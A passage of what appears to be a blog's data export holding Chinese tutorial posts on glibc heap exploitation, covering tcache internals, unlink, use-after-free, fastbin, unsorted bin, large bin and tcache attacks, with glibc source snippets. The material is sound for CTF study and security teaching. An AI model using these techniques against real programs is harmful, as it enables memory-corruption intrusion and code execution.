remainder.</p>\n<h3 id=\"tcache\"><a href=\"#tcache\" class=\"headerlink\" title=\"tcache\"></a>tcache</h3><p>在glibc2.26之后引入的新技术，提高了性能，但是由于<strong>舍弃了许多安全检查</strong>，带来了不小的风险。</p>\n<p>tcache的结构与fast bin有些类似，都是利用<strong>fd通过单向链表</strong>将<strong>相同大小</strong>的chunk链起来，且<strong>prev_inuse==1</strong>，但不同的是tcache中<strong>fd指向的是user data而不是chunk_addr</strong>。</p>\n<p>具体结构：</p>\n<p>每个线程都会维护一个tcache_perthread_struct，是整个tcache的管理结构，一共有TCACHE_MAX_BINS个计数器和TCACHE_MAX_BINS个tcache_entry。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">char</span> counts[TCACHE_MAX_BINS];</span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> TCACHE_MAX_BINS                64</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>tcache_entry就相当于是fast bin的头结点</strong>，后面连接大小相同的chunk;其中的count记录了tcache_entry连接的free chunk的个数，一般最多为<strong>7</strong>个，<strong>超过7个则放入其他的bin</strong>。</p>\n<p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为0x250，位于堆的开头。（<strong>因此可以被劫持</strong>）</p>\n<p>tcache与fast bin类似，是采用LIFO的单链表，每个bin内存在的堆块大小相同，大小从24~1032字节，一般每个bin最多存放7个。</p>\n<p>工作方式：</p>\n<p>在free的时候，会<strong>优先考虑放入tcache中</strong>，tcache中没有空位才会加入fast bin或者unsorted bin。与fast bin类似，tcache中chunk的<strong>prev_inuse位为1</strong>。</p>\n<p>在malloc的时候，也会<strong>优先从tcache中取出chunk（如果size在tcache范围0x408内）</strong>，如果tcache是空的，但fast bin、smalll bin中有对应size的chunk的话，则会<strong>将对应头结点下的其他chunk</strong>移到tcache的对应tcache_entry处，直到tcache被填满或bin被清空。如果是unsorted bin的话，则会将<strong>所有chunk</strong>移到tcache中继续处理。</p>\n<p>tcache采用tcache_put()和tcache_get()对chunk进行存取，这两个操作几乎没有安全保护，这是让tcache_entry[idx]指向新放入的chunk或取出tcache_entry[idx]指向的chunk，再修改count，并且不会修改prev_inuse。</p>"},{"title":"Heap Basic Attack","date":"2023-01-01T16:00:50.000Z","_content":"\n堆的利用方式非常多，但大多都不能直接获得shell，而是通过**改变程序流程**或者获得**任意写**再利用其它方式获得shell（如修改hook为one_gadget，FSOP等等）。\n<!--more-->\n\n### 堆溢出\n\n和栈溢出类似，堆溢出漏洞源于程序没有对写入的数据长度进行合理的控制，导致**程序向chunk中写入了超出其可使用大小的数据**(可使用大小不一定等于申请的大小，如large bin的切割机制导致了可使用的大小会大于申请的大小)。\n\n不同与栈溢出，堆溢出无法直接控制返回地址，其利用主要如下：\n\n1. 覆盖**物理地址上后面**的chunk的内容（如prev_size,size及其标志位,chunk中保存的内容）。\n2. 协助其它机制实现任意写（如unlink），通常是修改fd,bk,fd_nextsize,bkk_nextsize。\n\n### 堆的Off-By-One\n\n严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，即**仅仅溢出了一个字节**，通常在程序的边界检查不严格（循环设置出错）和字符串操作（没有注意末尾的'\\x00'）中出现。\n\n利用方式：\n\n1. 溢出字节为可控制任意字节：通过修改size造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。\n2. 溢出字节为NULL：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_inuse 位被清，这样前块会被认为是free块。\n    （1）这时可以选择使用 nlink方法进行处理。\n    （2）另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。（旧的unlink没有检查按照 prev_size 找到的块的大小与prev_size 是否一致）。\n\n`libc-2.29`增加了检测`next chunk`的`prev_size`，会报错：`malloc(): mismatching next->prev_size (unsorted)`，也增加了检测`next chunk`的地址是不是个堆块，会报错`malloc(): invalid next size (unsorted)`。\n`libc-2.23(11)`的版本，当释放某一个非`fast bin`的堆块时，若上/下某堆块空闲，则会检测该空闲堆块的`size`与其`next chunk`的`prev_size`是否相等。\n\n### chunk extend and overlapping（好像还有chunk shrink的，但没找资料）\n\nchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。实现overlapping之后，不但可以读取**已经free了的chunk的数据来泄露**信息（如unsorted bin头的main_arena+96），还可以对**bin或tcache中的chunk的内容进行修改**（如修改fd,bk）来协助进行其它攻击。\n\nchunk extend的原理在于：**ptmalloc通过prev_size和size的内容判断chunk的使用情况和对chunk的前后块进行定位**。简而言之，chunk extend通过**控制size和prev_size**来实现overlapping。实现chunk extend的前提是：能够控制size或prev_size。\n\n利用方法：\n\n1. 将chunk的size位改大，使其包含下一个chunk的内容后，将其释放。这样会将两个chunk一起释，再次请求可将两个chunk的内存一起请求回来，导致第二个chunk能在两个地方被控制，从而实现overlapping。\n2. 将已经释放的chunk的size位改大，这样malloc的时候就能把后面的内存一并申请出来，实现overlapping。（与1.类似）\n3. 修改chunk的prev_size和prev_inuse位，通过free前向合并时通过prev_size去定位，合并没有被释放的内存，实现overlappping。\n\n### unlink\n\n对unlink的利用，其实是对chunk进行内存布局，然后借助unlink操作来达成**修改指针**的效果。\n\n如果不考虑保护和针对large bin的操作的话，unlink主要的操作是：\n\n```c\n//P是要取出的chunk\nFD=P->fd;//FD为P的下一个chunk\nBK=P->bk;//BK为P的前一个chunk\n\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n```\n\n重点在于后面对bk和fd的修改:\n\n```c\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n//等价于\n*(FD+0x18)=BK\n*(BK+0x10)=FD\n```\n\n因此，如果我们能让FD，即**FD指向目标地址addr-0x18的位置，并且BK为我们想要修改为的内容value**，而且*(value+0x10)可写，那么我们就可以修改addr为我们指定的内容value。（比如可以修改GOT表项）\n\n然而现在的libc中，**进行赋值之前**有对fd和bk的检查:\n\n```c\n// fd bk\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n```\n\n为了绕过检查，我们需要伪造FD和BK，使其满足下列条件之后才能赋值。\n\n```c\n*(fakeFD+0x18)==P==*(fakeBK+0x10)\n//因此fakeFD=&P-0x18\n//fakeBK=&P-0x10\n```\n\n执行unlink时\n\n```c\n*(fakeFD+0x18)=fakeBK\n*(fakeBK+0x10)=fakeFD\n//由于*(FD+0x18)==P==*(BK+0x10)\n//因此等价于\n//*P=&P-0x10\n//*P=&P-0x18\n```\n\n最终*P=&P-0x18，即P指向了比原来低0x18的位置。\n\n通过这种方法，如果我们能控制small bin或unsorted bin中chunk的fd和bk，并且我们能知道这个chunk的地址，那么就可以利用unlink使得该chunk指针ptr指向ptr-0x18的位置。\n\n过程：\n\n1. 修改ptr->fd=ptr-0x18\n2. 修改ptr->bk=ptr-0x10\n3. 触发unlink\n\n### Use After Free(UAF)\n\n就像它的名字一样，UAF指的是1个chunk被释放后被使用，主要有2种情况：\n\n1. chunk被释放后，对应的指针赋值为NULL，但其他函数执行前没有进行检查，仍会对其进行操作，导致程序崩溃。\n2. chunk被释放后，对应的指针没有被赋NULL，此时其他函数可以正常对该chunk进行操作。\n\n一般第2种情况是我们利用的。UAF需要搭配其他方法进行使用，比如根据unsorted bin chunk的特性，用函数输出已经释放的chunk中的内容，从而泄露信息；或者用来修改fast bin chunk的fd，达到fast bin attack...\n\n### Fast bin Attack\n\nFastbin Attack通常指基于fastbin机制的利用，利用的前提是：\n\n- 存在堆溢出或UAF等能控制chunk内容的漏洞\n- 漏洞发生于fast bin chunk\n\nFastbin Attack主要利用的是fastbin的特殊机制，fastbin是使用**单链表(fd)**来维护释放的堆块的，并且由fastbin管理的 chunk**即使被释放，其next_chunk的prev_inuse位也不会被清空**。 \n\n#### Fastbin Double Free\n\nFastbin Double Free通过对1个chunk的多次释放，改变fast bin中fd的指向。其利用的主要是**fastbin不会清空prev_inuse位**，并且在释放时，**只检查当前释放的chunk与bin头结点指向的chunk是否相同**，而没有检查后续的chunk的机制。\n\n因此，我们只要在两次释放之间隔着一个不同的chunk，就可以实现Fastbin Double Free。\n\n在释放之后，fast bin的结构如下：\n\n![FastbinDoubleFree](./heap_attack/FastbinDoubleFree.png)\n\n在1次malloc之后，我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。如果**更进一步修改 fd 指针**，则能够实现**任意地址分配堆块**的效果 (首先要通过验证，即size符合当前fast bin的大小)，这就相当于任意地址任意写的效果。\n\n#### House of Spirit\n\nHouse of Spirit是通过在目标位置**伪造**fastbin chunk，并让其被释放，从而达到**申请指定地址内存**的目的。\n\n由于free的特性，House of Spirit的重点在于**修改指定地址前后的内容使其能绕过free的检测**。\n\n需要的绕过：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的**size大小需要满足对应的fastbin** 的需求，同时也得**对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n- fake chunk对应的fastbin**链表头部不能是该fake chunk**，即不能构成double free的情况。\n\n在达成条件之后，将该fake chunk释放，再重新malloc就能得到该部分内存。\n\n#### Arbitrary Alloc\n\n由于fast bin中通过fd指向下一个chunk，如果我们**将想要获取的内存看作一个fake chunk**，那么只要其**size的大小满足fast bin的要求**，并且**控制fast bin中的fd指向fake chunk**，那么我们就能将这个fake chunk申请过来，实现任意读或任意写。\n\n要让size满足要求，我们可以**逐字节进行调节（参考malloc到__malloc_hook的过程）**，找到在fast bin size范围内的大小，且能包含我们想要的内存即可。（由于不用绕过free，可以不用对齐）\n\n要控制fast bin中chunk的fd，可以利用Fastbin Double Free、UAF、overlapping、堆溢出等方法。\n\n### Unsorted bin Attack\n\nUnsorted bin Attack是对unsorted bin机制的利用。\n\n#### Unsorted bin Leak\n\nUnsort bin Leak主要是利用了unsorted bin使用**fd和bk的双向链表**管理chunk的机制，**始终会有一个chunk的fd和一个chunk的bk指向unsorted bin的头结点，而头结点在main_arena内部**，与main_arena的偏移是固定的(96)。特别的，当只有1个chunk的时候，这个chunk的fd和bk都会指向一个unsorted bin的头结点。\n\n因此，借助UAF、overlapping等方式，我们可以泄露unsorted bin头结点的地址，从而得到main_arena，再利用与main_arena固定偏移0x10的__malloc_hook得到出libc。（也可以通过malloc_trim()函数得出）\n\n#### Unsorted bin Attack\n\nUnsorted bin Attack利用了unsorted bin的特性，当一个chunk从unsorted bin中取出的时候，会将unsorted bin的地址写入到bck->fd的位置（bck==P->bk）。\n\n```c\n//相当于将unsorted bin放在了victim的位置，修改bck和bin的fd和bk指针\nbck = victim->bk;\nunsorted_chunks(av)->bk = bck;\nbck->fd = unsorted_chunks(av);\n```\n\n换而言之，如果我们能**控制一个unsorted bin chunk的bk**，并且将其取出，那么就能**在bk+0x10的位置写入unsorted bin的地址**。这个地址通常是一个**很大的值**，借助这点，我们可以**控制程序执行流程**（改变判断条件，修改循环次数），甚至可以修改heap中的global_max_fast来**使得更大的chunk可以被视为fast bin**，这样我们就可以去执行一些fast bin attack了。\n\n### Large bin Attack\n\nLarge bin Attack利用的是chunk从unsorted bin进入到large bin时缺少检查。当malloc遍历unsorted bin时，如果该chunk**不是刚好满足大小并且不满足切割条件**的话，则会放入对应的bin中。而在放入large bin的时候，缺少了对nextsize指针的检查。通过Large bin Attack，可以**将当前chunk的地址写入bk_nextsize+0x20的位置**（类似unsorted bin attack）。\n\n在2.29及以下版本的glibc中，根据chunk的大小有不同的利用。\n\n如果chunk**小于**该large bin中最小的chunk的时候会执行:\n\n```c\nfwd = bck; //使得fwd=large bin\nbck = bck->bk; //使得bck=末尾的chunk(最小的chunk)\n\n//下面均没有对victim的nextsize指针进行检测就直接赋值了\nvictim->fd_nextsize = fwd->fd;\nvictim->bk_nextsize = fwd->fd->bk_nextsize;\nfwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n//fwd为当前chunk的fd指向的chunk，在这种情况下为large bin头，victim为当前chunk\n//这条语句的作用是：修改通过nextsize指针连接的相邻chunk的fd_nextsize和bk_nextsize，即在nextsize list中插入新的chunk\n```\n\n如果chunk**大于**该large bin中最小的chunk的时候会执行:\n\n```c\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\n如果chunk**等于**该large bin中最小的chunk，则会使用其他方法插入，所以此时无法利用。\n\n在2.30版本新加入了对largebin跳表的完整性检查，使chunk大于链表中最小的chunk时的利用失效，必须使chunk**小于**链表中最小的chunk，通过下面的语句将当前chunk的地址写入bk_nextsize+0x20的位置。\n\n```c\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\nLarge bin Attack的条件：\n\n1. 可以修改一个large bin chunk的 data\n2. 从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面\n\n作用：\n\n1. 通过large bin attack可以辅助Tcache Stash Unlink+攻击\n2. 可以修改_IO_list_all便于伪造_IO_FILE 结构体进行FSOP。\n\n### Tcache Attack\n\n由于Tcache本身检查约等于0，因此Tcache的利用都方便许多。其本身可以看作是没有什么检查的fast bin。\n\n#### Tcache Poisoning\n\n主要利用的是tcache_get()从tcache中获取chunk的时候几乎没有检查，会利fd指针逐个取出chunk。因此，只需要**将tcache中的chunk的fd指向任意内存即可将其取出**。\n\n#### Tcache Dup（Tcache Double free）\n\n类似于fast bin dup(Fast bin Double free)，不过利用的是tcache_put()中的不严谨，**可以直接连续free同一个chunk来做到double free**。\n\n但在glibc2.29之后，tcache中增加了对此的检查，会在tcache_entry中引入一个标志key，表示chunk是否已经在该tcache bin中，每个chunk在放入tcache时都会检查key。\n\n即便如此有些方法能绕过检查的，不过需要利用fast bin double free和tcache stash机制。\n\n(1) 首先需要将tcache填满并实现fast bin double free\n\n`tcache`中为：`C6->C5->C4->C3->C2->C1->C0`，`fast bin`中为：`C7->C8->C7`。\n\n(2) 之后，为了分配到`fast bin`，需要先申请`7`个，让`tcache`为空（或`calloc`），再次申请时就会返回`fast bin`中的`C7`，同时由于`tcache stash`机制，`fast bin`中剩下的`C8`,`C7`均被放入了`tcache bin`。此时，在`C7`的`fd`字段写入`target_addr`（相当于获得了`Edit`功能），于是`target_addr`也被放入了`tcache bin`，因此这里`target_addr`处甚至不需要伪造`size`（`target_addr`指向`user data`区）。\n(3) 此时，`tcache bin`中单链表为：`C8->C7->target_addr`，再申请到`target_addr`，从而得到了一个真正的任意写。\n\n#### Tcache Perthread Corruption\n\ntcache_perthread_struct是整个tcache的管理结构，而**这个结构是存储在堆上**的。如果能控制这个结构体，那么无论我们malloc的size是多少，地址都是可控的。不过这需要我们利用其它方法来申请到这块内存。\n\n#### Tcache House Of Spirit\n\n原理是House Of Spirit，不过由于tcache检查的松散，因此更容易利用，我们**可以不用管prev_inuse位**，但其他条件仍是需要满足的。\n\n如：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n\n#### Tcache Stashing Unlink Attack\n\n这种攻击利用的是tcache有**剩余**时，同大小的small bin会放进tcache中。在获取到一个smallbin中的一个chunk后会如果tcache仍有足够空闲位置，会将**剩余的**small bin链入tcache，在这个过程中**只对第一个bin进行了完整性检查**。\n\n\n当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址 (类似 unsorted bin attack 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。\n\n而calloc分配堆块时**不从tcache中选取，直接从small bin中取**，可以触发攻击。\n\n具体利用：\n\n想办法改写smallbin中**倒数第二个chunk的bk**指向fake chunk，在利用calloc取出了small bin中的一个chunk后，剩余的chunk会放入tcache中。Small bin遵循**FIFO**，**利用bk进行遍历**，因此倒数第二个chunk会先放入tcache，fake chunk会后放入tcache。由于tcache遵循**LIFO**，因此此时处于tcache头的是fake chunk，下一次malloc即可得到其内存。\n\n#### libc leak\n\n算是tcache带来的一点点麻烦，要用到bin的话需要先将对应的tcache填满。\n","source":"_posts/heap_attack.md","raw":"---\ntitle: Heap Basic Attack\ndate: 2023-01-02 00:00:50\ncategories: \n- pwn\ntags: \n- pwn\n- heap \n---\n\n堆的利用方式非常多，但大多都不能直接获得shell，而是通过**改变程序流程**或者获得**任意写**再利用其它方式获得shell（如修改hook为one_gadget，FSOP等等）。\n<!--more-->\n\n### 堆溢出\n\n和栈溢出类似，堆溢出漏洞源于程序没有对写入的数据长度进行合理的控制，导致**程序向chunk中写入了超出其可使用大小的数据**(可使用大小不一定等于申请的大小，如large bin的切割机制导致了可使用的大小会大于申请的大小)。\n\n不同与栈溢出，堆溢出无法直接控制返回地址，其利用主要如下：\n\n1. 覆盖**物理地址上后面**的chunk的内容（如prev_size,size及其标志位,chunk中保存的内容）。\n2. 协助其它机制实现任意写（如unlink），通常是修改fd,bk,fd_nextsize,bkk_nextsize。\n\n### 堆的Off-By-One\n\n严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，即**仅仅溢出了一个字节**，通常在程序的边界检查不严格（循环设置出错）和字符串操作（没有注意末尾的'\\x00'）中出现。\n\n利用方式：\n\n1. 溢出字节为可控制任意字节：通过修改size造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。\n2. 溢出字节为NULL：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_inuse 位被清，这样前块会被认为是free块。\n    （1）这时可以选择使用 nlink方法进行处理。\n    （2）另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。（旧的unlink没有检查按照 prev_size 找到的块的大小与prev_size 是否一致）。\n\n`libc-2.29`增加了检测`next chunk`的`prev_size`，会报错：`malloc(): mismatching next->prev_size (unsorted)`，也增加了检测`next chunk`的地址是不是个堆块，会报错`malloc(): invalid next size (unsorted)`。\n`libc-2.23(11)`的版本，当释放某一个非`fast bin`的堆块时，若上/下某堆块空闲，则会检测该空闲堆块的`size`与其`next chunk`的`prev_size`是否相等。\n\n### chunk extend and overlapping（好像还有chunk shrink的，但没找资料）\n\nchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。实现overlapping之后，不但可以读取**已经free了的chunk的数据来泄露**信息（如unsorted bin头的main_arena+96），还可以对**bin或tcache中的chunk的内容进行修改**（如修改fd,bk）来协助进行其它攻击。\n\nchunk extend的原理在于：**ptmalloc通过prev_size和size的内容判断chunk的使用情况和对chunk的前后块进行定位**。简而言之，chunk extend通过**控制size和prev_size**来实现overlapping。实现chunk extend的前提是：能够控制size或prev_size。\n\n利用方法：\n\n1. 将chunk的size位改大，使其包含下一个chunk的内容后，将其释放。这样会将两个chunk一起释，再次请求可将两个chunk的内存一起请求回来，导致第二个chunk能在两个地方被控制，从而实现overlapping。\n2. 将已经释放的chunk的size位改大，这样malloc的时候就能把后面的内存一并申请出来，实现overlapping。（与1.类似）\n3. 修改chunk的prev_size和prev_inuse位，通过free前向合并时通过prev_size去定位，合并没有被释放的内存，实现overlappping。\n\n### unlink\n\n对unlink的利用，其实是对chunk进行内存布局，然后借助unlink操作来达成**修改指针**的效果。\n\n如果不考虑保护和针对large bin的操作的话，unlink主要的操作是：\n\n```c\n//P是要取出的chunk\nFD=P->fd;//FD为P的下一个chunk\nBK=P->bk;//BK为P的前一个chunk\n\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n```\n\n重点在于后面对bk和fd的修改:\n\n```c\n//在fd和bk的双向链表中去掉P\nFD->bk=BK;\nBK->fd=FD;\n\n//等价于\n*(FD+0x18)=BK\n*(BK+0x10)=FD\n```\n\n因此，如果我们能让FD，即**FD指向目标地址addr-0x18的位置，并且BK为我们想要修改为的内容value**，而且*(value+0x10)可写，那么我们就可以修改addr为我们指定的内容value。（比如可以修改GOT表项）\n\n然而现在的libc中，**进行赋值之前**有对fd和bk的检查:\n\n```c\n// fd bk\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n```\n\n为了绕过检查，我们需要伪造FD和BK，使其满足下列条件之后才能赋值。\n\n```c\n*(fakeFD+0x18)==P==*(fakeBK+0x10)\n//因此fakeFD=&P-0x18\n//fakeBK=&P-0x10\n```\n\n执行unlink时\n\n```c\n*(fakeFD+0x18)=fakeBK\n*(fakeBK+0x10)=fakeFD\n//由于*(FD+0x18)==P==*(BK+0x10)\n//因此等价于\n//*P=&P-0x10\n//*P=&P-0x18\n```\n\n最终*P=&P-0x18，即P指向了比原来低0x18的位置。\n\n通过这种方法，如果我们能控制small bin或unsorted bin中chunk的fd和bk，并且我们能知道这个chunk的地址，那么就可以利用unlink使得该chunk指针ptr指向ptr-0x18的位置。\n\n过程：\n\n1. 修改ptr->fd=ptr-0x18\n2. 修改ptr->bk=ptr-0x10\n3. 触发unlink\n\n### Use After Free(UAF)\n\n就像它的名字一样，UAF指的是1个chunk被释放后被使用，主要有2种情况：\n\n1. chunk被释放后，对应的指针赋值为NULL，但其他函数执行前没有进行检查，仍会对其进行操作，导致程序崩溃。\n2. chunk被释放后，对应的指针没有被赋NULL，此时其他函数可以正常对该chunk进行操作。\n\n一般第2种情况是我们利用的。UAF需要搭配其他方法进行使用，比如根据unsorted bin chunk的特性，用函数输出已经释放的chunk中的内容，从而泄露信息；或者用来修改fast bin chunk的fd，达到fast bin attack...\n\n### Fast bin Attack\n\nFastbin Attack通常指基于fastbin机制的利用，利用的前提是：\n\n- 存在堆溢出或UAF等能控制chunk内容的漏洞\n- 漏洞发生于fast bin chunk\n\nFastbin Attack主要利用的是fastbin的特殊机制，fastbin是使用**单链表(fd)**来维护释放的堆块的，并且由fastbin管理的 chunk**即使被释放，其next_chunk的prev_inuse位也不会被清空**。 \n\n#### Fastbin Double Free\n\nFastbin Double Free通过对1个chunk的多次释放，改变fast bin中fd的指向。其利用的主要是**fastbin不会清空prev_inuse位**，并且在释放时，**只检查当前释放的chunk与bin头结点指向的chunk是否相同**，而没有检查后续的chunk的机制。\n\n因此，我们只要在两次释放之间隔着一个不同的chunk，就可以实现Fastbin Double Free。\n\n在释放之后，fast bin的结构如下：\n\n![FastbinDoubleFree](./heap_attack/FastbinDoubleFree.png)\n\n在1次malloc之后，我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。如果**更进一步修改 fd 指针**，则能够实现**任意地址分配堆块**的效果 (首先要通过验证，即size符合当前fast bin的大小)，这就相当于任意地址任意写的效果。\n\n#### House of Spirit\n\nHouse of Spirit是通过在目标位置**伪造**fastbin chunk，并让其被释放，从而达到**申请指定地址内存**的目的。\n\n由于free的特性，House of Spirit的重点在于**修改指定地址前后的内容使其能绕过free的检测**。\n\n需要的绕过：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的**size大小需要满足对应的fastbin** 的需求，同时也得**对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n- fake chunk对应的fastbin**链表头部不能是该fake chunk**，即不能构成double free的情况。\n\n在达成条件之后，将该fake chunk释放，再重新malloc就能得到该部分内存。\n\n#### Arbitrary Alloc\n\n由于fast bin中通过fd指向下一个chunk，如果我们**将想要获取的内存看作一个fake chunk**，那么只要其**size的大小满足fast bin的要求**，并且**控制fast bin中的fd指向fake chunk**，那么我们就能将这个fake chunk申请过来，实现任意读或任意写。\n\n要让size满足要求，我们可以**逐字节进行调节（参考malloc到__malloc_hook的过程）**，找到在fast bin size范围内的大小，且能包含我们想要的内存即可。（由于不用绕过free，可以不用对齐）\n\n要控制fast bin中chunk的fd，可以利用Fastbin Double Free、UAF、overlapping、堆溢出等方法。\n\n### Unsorted bin Attack\n\nUnsorted bin Attack是对unsorted bin机制的利用。\n\n#### Unsorted bin Leak\n\nUnsort bin Leak主要是利用了unsorted bin使用**fd和bk的双向链表**管理chunk的机制，**始终会有一个chunk的fd和一个chunk的bk指向unsorted bin的头结点，而头结点在main_arena内部**，与main_arena的偏移是固定的(96)。特别的，当只有1个chunk的时候，这个chunk的fd和bk都会指向一个unsorted bin的头结点。\n\n因此，借助UAF、overlapping等方式，我们可以泄露unsorted bin头结点的地址，从而得到main_arena，再利用与main_arena固定偏移0x10的__malloc_hook得到出libc。（也可以通过malloc_trim()函数得出）\n\n#### Unsorted bin Attack\n\nUnsorted bin Attack利用了unsorted bin的特性，当一个chunk从unsorted bin中取出的时候，会将unsorted bin的地址写入到bck->fd的位置（bck==P->bk）。\n\n```c\n//相当于将unsorted bin放在了victim的位置，修改bck和bin的fd和bk指针\nbck = victim->bk;\nunsorted_chunks(av)->bk = bck;\nbck->fd = unsorted_chunks(av);\n```\n\n换而言之，如果我们能**控制一个unsorted bin chunk的bk**，并且将其取出，那么就能**在bk+0x10的位置写入unsorted bin的地址**。这个地址通常是一个**很大的值**，借助这点，我们可以**控制程序执行流程**（改变判断条件，修改循环次数），甚至可以修改heap中的global_max_fast来**使得更大的chunk可以被视为fast bin**，这样我们就可以去执行一些fast bin attack了。\n\n### Large bin Attack\n\nLarge bin Attack利用的是chunk从unsorted bin进入到large bin时缺少检查。当malloc遍历unsorted bin时，如果该chunk**不是刚好满足大小并且不满足切割条件**的话，则会放入对应的bin中。而在放入large bin的时候，缺少了对nextsize指针的检查。通过Large bin Attack，可以**将当前chunk的地址写入bk_nextsize+0x20的位置**（类似unsorted bin attack）。\n\n在2.29及以下版本的glibc中，根据chunk的大小有不同的利用。\n\n如果chunk**小于**该large bin中最小的chunk的时候会执行:\n\n```c\nfwd = bck; //使得fwd=large bin\nbck = bck->bk; //使得bck=末尾的chunk(最小的chunk)\n\n//下面均没有对victim的nextsize指针进行检测就直接赋值了\nvictim->fd_nextsize = fwd->fd;\nvictim->bk_nextsize = fwd->fd->bk_nextsize;\nfwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n//fwd为当前chunk的fd指向的chunk，在这种情况下为large bin头，victim为当前chunk\n//这条语句的作用是：修改通过nextsize指针连接的相邻chunk的fd_nextsize和bk_nextsize，即在nextsize list中插入新的chunk\n```\n\n如果chunk**大于**该large bin中最小的chunk的时候会执行:\n\n```c\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\n如果chunk**等于**该large bin中最小的chunk，则会使用其他方法插入，所以此时无法利用。\n\n在2.30版本新加入了对largebin跳表的完整性检查，使chunk大于链表中最小的chunk时的利用失效，必须使chunk**小于**链表中最小的chunk，通过下面的语句将当前chunk的地址写入bk_nextsize+0x20的位置。\n\n```c\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\nLarge bin Attack的条件：\n\n1. 可以修改一个large bin chunk的 data\n2. 从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面\n\n作用：\n\n1. 通过large bin attack可以辅助Tcache Stash Unlink+攻击\n2. 可以修改_IO_list_all便于伪造_IO_FILE 结构体进行FSOP。\n\n### Tcache Attack\n\n由于Tcache本身检查约等于0，因此Tcache的利用都方便许多。其本身可以看作是没有什么检查的fast bin。\n\n#### Tcache Poisoning\n\n主要利用的是tcache_get()从tcache中获取chunk的时候几乎没有检查，会利fd指针逐个取出chunk。因此，只需要**将tcache中的chunk的fd指向任意内存即可将其取出**。\n\n#### Tcache Dup（Tcache Double free）\n\n类似于fast bin dup(Fast bin Double free)，不过利用的是tcache_put()中的不严谨，**可以直接连续free同一个chunk来做到double free**。\n\n但在glibc2.29之后，tcache中增加了对此的检查，会在tcache_entry中引入一个标志key，表示chunk是否已经在该tcache bin中，每个chunk在放入tcache时都会检查key。\n\n即便如此有些方法能绕过检查的，不过需要利用fast bin double free和tcache stash机制。\n\n(1) 首先需要将tcache填满并实现fast bin double free\n\n`tcache`中为：`C6->C5->C4->C3->C2->C1->C0`，`fast bin`中为：`C7->C8->C7`。\n\n(2) 之后，为了分配到`fast bin`，需要先申请`7`个，让`tcache`为空（或`calloc`），再次申请时就会返回`fast bin`中的`C7`，同时由于`tcache stash`机制，`fast bin`中剩下的`C8`,`C7`均被放入了`tcache bin`。此时，在`C7`的`fd`字段写入`target_addr`（相当于获得了`Edit`功能），于是`target_addr`也被放入了`tcache bin`，因此这里`target_addr`处甚至不需要伪造`size`（`target_addr`指向`user data`区）。\n(3) 此时，`tcache bin`中单链表为：`C8->C7->target_addr`，再申请到`target_addr`，从而得到了一个真正的任意写。\n\n#### Tcache Perthread Corruption\n\ntcache_perthread_struct是整个tcache的管理结构，而**这个结构是存储在堆上**的。如果能控制这个结构体，那么无论我们malloc的size是多少，地址都是可控的。不过这需要我们利用其它方法来申请到这块内存。\n\n#### Tcache House Of Spirit\n\n原理是House Of Spirit，不过由于tcache检查的松散，因此更容易利用，我们**可以不用管prev_inuse位**，但其他条件仍是需要满足的。\n\n如：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 